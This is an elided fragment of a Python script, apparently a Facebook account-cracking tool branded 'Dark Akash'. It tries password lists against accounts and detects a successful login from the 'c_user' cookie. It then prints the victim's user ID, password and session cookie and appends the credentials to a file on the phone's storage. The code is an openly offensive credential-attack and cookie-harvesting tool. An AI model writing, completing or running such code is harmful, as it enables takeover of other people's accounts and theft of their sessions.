...
ha = current.day
today = date.today()
#Dark Akash2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mDark Akash')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Dark Akash/1.2.0 OPN-B'
...
\033[1;92m      #.                    ##           ##                    # #####    #             # 
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mDark Akash \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mDark Akash Ahmmed \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100031202267493')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Dark Akash_OK.mp3")
                print('\033[1;92m[Dark Akash-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Dark Akash-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mDark Akash","\x1b[1;92mDark Akash","\x1b[1;93mDark Akash","\x1b[1;94mDark Akash","\x1b[1;95mDark Akash","\x1b[1;96mDark Akash","\x1b[1;97mDark Akash","\x1b[1;91mDark Akash","\x1b[1;92mDark Akash","\x1b[1;93mDark Akash","\x1b[1;94mDark Akash","\x1b[1;95mDark Akash","\x1b[1;96mDark Akash"])
